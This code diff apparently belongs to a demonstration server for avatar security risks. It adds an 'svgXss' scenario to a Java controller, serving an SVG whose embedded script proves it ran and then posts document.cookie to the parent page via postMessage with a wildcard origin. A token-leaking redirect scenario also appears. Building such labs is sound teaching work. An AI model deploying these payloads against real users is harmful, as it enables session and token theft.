@@ -46,7 +46,58 @@ public class AvatarRiskController {
     private static final Logger log = LoggerFactory.getLogger(AvatarRiskController.class);
 
     private static final Pattern TOKEN_PATTERN = Pattern.compile("^[a-f0-9]{32}$");
-    private static final Pattern SCENARIO_PATTERN = Pattern.compile("^(horror|redirect|authPrompt|slow|oversized|broken)$");
+    private static final Pattern SCENARIO_PATTERN = Pattern.compile("^(horror|redirect|authPrompt|slow|oversized|broken|svgXss)$");
+
+    /**
+     * 带脚本的 SVG payload。
+     * <p>
+     * &lt;img&gt; 加载 → 浏览器进入 secure animation mode，&lt;script&gt; 不执行，只渲染 SVG 本身。
+     * &lt;object&gt;/&lt;iframe&gt;/inline → 脚本以 SVG 自己的 origin 执行（演示用法）。
+     * <p>
+     * 由于 Chrome 92+ 跨域 iframe/object 的 alert 会被静默拦截、跨域读 window.top 也会抛 SecurityError，
+     * 这里采用两条互补的"证明脚本运行了"的手段：
+     * <ol>
+     *   <li>修改 SVG 自身的 &lt;text&gt;，直接把"SCRIPT_NOT_RUN"改成"✅ 脚本已执行"，肉眼可见</li>
+     *   <li>postMessage 通知宿主页面，宿主收到后注入红色横幅，演示 XSS 跨域沟通</li>
+     * </ol>
+     */
+    private static final String SVG_XSS_PAYLOAD = """
+            <?xml version="1.0" standalone="no"?>
+            <svg xmlns="http://www.w3.org/2000/svg" width="240" height="240" viewBox="0 0 240 240">
+              <rect width="240" height="240" fill="#1a1a2e"/>
+              <circle cx="120" cy="90" r="46" fill="#ff6b6b"/>
+              <text x="120" y="98" text-anchor="middle" fill="#fff"
+                    font-family="sans-serif" font-size="40" font-weight="bold">XSS</text>
+              <text id="svg-xss-status" x="120" y="170" text-anchor="middle" fill="#888"
+                    font-family="sans-serif" font-size="14">SCRIPT_NOT_RUN</text>
+              <text x="120" y="200" text-anchor="middle" fill="#666"
+                    font-family="sans-serif" font-size="11">img 加载时这行不变</text>
+              <text x="120" y="220" text-anchor="middle" fill="#666"
+                    font-family="sans-serif" font-size="11">object/iframe 加载时变绿色</text>
+              <script type="application/ecmascript"><![CDATA[
+                (function() {
+                  // 1) 直接改 SVG 自身 DOM，证明脚本已执行（不受跨域限制）
+                  var status = document.getElementById('svg-xss-status');
+                  if (status) {
+                    status.textContent = '✅ 脚本已执行！';
+                    status.setAttribute('fill', '#81c784');
+                    status.setAttribute('font-weight', 'bold');
+                  }
+                  // 2) 通过 postMessage 通知宿主页面，绕过跨域 alert 拦截
+                  try {
+                    if (window.parent && window.parent !== window) {
+                      window.parent.postMessage({
+                        type: 'avatar-risk-svg-xss',
+                        cookie: document.cookie || '(none)',
+                        origin: location.origin,
+                        ts: Date.now()
+                      }, '*');
+                    }
+                  } catch (e) { /* ignore */ }
+                })();
+              ]]></script>
+            </svg>
+            """;
 
     private final AvatarRiskService service;
 
@@ -169,6 +220,15 @@ public class AvatarRiskController {
             return Mono.just(ResponseEntity.status(HttpStatus.FOUND)
                     .location(URI.create("http://localhost:8080/admin?stolen_avatar_token=" + token))
                     .body((Object) "Redirecting..."));
+        }
+
+        // 场景：返回带 <script> 的 SVG
+        if (state.svgXss()) {
+            return Mono.just(ResponseEntity.ok()
+                    .contentType(MediaType.valueOf("image/svg+xml"))
+                    .header(HttpHeaders.CACHE_CONTROL, "no-store")
+                    .header("X-Avatar-Mode", "svg-xss")
+                    .body((Object) SVG_XSS_PAYLOAD));
         }
 
         // 场景：延迟 8 秒
